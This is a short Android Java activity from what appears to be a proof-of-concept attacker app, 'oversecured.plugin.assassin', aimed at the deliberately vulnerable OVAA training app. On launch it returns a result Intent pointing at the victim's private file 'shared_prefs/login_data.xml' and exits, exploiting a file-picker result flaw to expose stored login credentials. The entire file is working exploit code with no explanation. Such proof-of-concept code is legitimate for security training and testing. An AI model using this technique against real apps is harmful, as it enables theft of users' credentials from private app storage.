package oversecured.plugin.assassin;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import oversecured.plugin.assassin.R;

public class PickerActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_picker);
        setResult(-1, new Intent().setData(Uri.parse("file:///data/data/oversecured.ovaa/shared_prefs/login_data.xml")));
        finish();
    }
}